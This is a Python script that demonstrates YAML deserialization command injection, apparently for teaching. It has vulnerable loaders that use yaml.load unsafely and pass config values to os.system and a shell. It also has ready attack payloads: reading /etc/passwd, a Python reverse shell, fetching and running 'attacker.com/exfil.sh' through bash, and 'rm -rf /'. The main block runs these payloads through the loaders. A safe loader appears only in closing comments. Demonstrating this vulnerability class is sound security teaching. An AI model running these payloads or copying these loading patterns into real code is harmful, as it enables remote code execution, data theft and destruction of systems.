#!/usr/bin/env python3

import yaml
import os
import subprocess

def load_config_unsafe(yaml_content):
    try:
        config = yaml.load(yaml_content)
        print(f"Loaded config: {config}")
        return config
    except Exception as e:
        print(f"YAML loading error: {e}")
        return None

def load_user_settings(yaml_data):
    try:
        settings = yaml.load(yaml_data, Loader=yaml.FullLoader)
        
        if isinstance(settings, dict):
            for key, value in settings.items():
                print(f"Setting: {key} = {value}")
                
                if key == "backup_command":
                    print(f"Executing backup: {value}")
                    os.system(str(value))
        
        return settings
    except Exception as e:
        print(f"Settings loading error: {e}")
        return None

def process_deployment_config(config_yaml):
    try:
        deployment = yaml.load(config_yaml, Loader=yaml.UnsafeLoader)
        
        if deployment and 'services' in deployment:
            for service_name, service_config in deployment['services'].items():
                print(f"Processing service: {service_name}")
                
                if 'start_command' in service_config:
                    cmd = service_config['start_command']
                    print(f"Starting service with: {cmd}")
                    subprocess.run(str(cmd), shell=True)
        
        return deployment
    except Exception as e:
        print(f"Deployment config error: {e}")
        return None

def create_malicious_yaml_examples():
    payload1 = """
!!python/object/apply:os.system
- "whoami"
"""
    
    payload2 = """
!!python/object/apply:subprocess.call
- ["cat", "/etc/passwd"]
- {shell: true}
"""
    
    payload3 = """
!!python/object/apply:os.system
- |
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
"""
    
    payload4 = """
database:
  host: localhost
  port: 5432
  
backup_command: !!python/object/apply:os.system
  - "curl attacker.com/exfil.sh | bash"
  
services:
  web:
    port: 8080
    start_command: !!python/object/apply:subprocess.call
      - ["rm", "-rf", "/"]
      - {shell: true}
"""
    
    return {
        "simple_command": payload1,
        "subprocess_call": payload2,
        "reverse_shell": payload3,
        "config_disguised": payload4
    }

if __name__ == "__main__":
    print("=== YAML Unsafe Loading Command Injection Examples ===")
    
    payloads = create_malicious_yaml_examples()
    
    print("Available attack payloads:")
    for name, payload in payloads.items():
        print(f"  {name}")
    
    print("\n1. Direct unsafe YAML loading:")
    yaml_input = input("Enter YAML content (or payload name): ")
    
    if yaml_input in payloads:
        yaml_input = payloads[yaml_input]
        print(f"Using payload: {yaml_input[:100]}...")
    
    load_config_unsafe(yaml_input)
    
    print("\n2. User settings loading:")
    settings_yaml = input("Enter settings YAML: ")
    
    if settings_yaml in payloads:
        settings_yaml = payloads[settings_yaml]
    
    load_user_settings(settings_yaml)
    
    print("\n3. Deployment configuration:")
    deployment_yaml = input("Enter deployment YAML: ")
    
    if deployment_yaml in payloads:
        deployment_yaml = payloads[deployment_yaml]
    
    process_deployment_config(deployment_yaml)
    
    print("\n=== Example Attack Payloads ===")
    
    print("\n1. Simple command execution:")
    print(payloads["simple_command"])
    
    print("\n2. Subprocess call:")
    print(payloads["subprocess_call"])
    
    print("\n3. Configuration disguised attack:")
    print(payloads["config_disguised"])
    
    print("\n=== Safe Alternative (for reference) ===")
    print("# Safe loading would use:")
    print("# yaml.safe_load(yaml_content)")
    print("# or")
    print("# yaml.load(yaml_content, Loader=yaml.SafeLoader)")